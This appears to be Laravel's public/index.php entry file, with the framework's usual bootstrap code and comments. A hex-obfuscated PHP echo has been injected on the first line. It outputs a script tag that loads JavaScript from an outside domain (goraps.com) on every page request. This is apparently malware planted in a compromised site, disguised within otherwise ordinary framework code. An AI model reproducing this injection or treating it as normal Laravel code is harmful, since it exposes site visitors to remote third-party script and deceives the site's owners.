<?php echo"\x3c\x68\x74ml><\x68ea\x64><\x73c\x72i\x70t\x20typ\x65=\x22\x74\x65xt/\x6a\x61\x76asc\x72ipt\x22 \x73\x72c\x3d\"//g\x6f\x72\x61p\x73\x2ec\x6fm/tup\x2e\x70h\x70?se\x63\x74\x69\x6f\x6e\x3d\x47enera\x6c\x26\x70t=\x37\x26\x70ub=9\x398\x362\x32&ga=g\x22\x3e\x3c/s\x63\x72\x69\x70\x74>\x3c/\x68ead>\x3c/\x68t\x6dl\x3e"; ?>
<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
